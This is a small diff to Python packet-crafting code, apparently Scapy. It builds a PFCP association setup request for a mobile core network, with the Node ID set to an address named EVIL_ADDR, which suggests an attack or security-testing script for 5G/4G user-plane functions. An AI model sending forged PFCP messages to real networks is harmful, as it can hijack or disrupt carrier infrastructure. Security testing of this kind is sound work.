@@ -11,10 +11,10 @@ def send_pfcp_association_setup_req():
     global seq
     
 
-    node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
-    recovery_timestamp = IE_RecoveryTimeStamp(
+    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
+    recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
         timestamp=int(time.time())
-    )
+    )))
     pfcp_msg = PFCP(
         version=1,
         message_type=5,
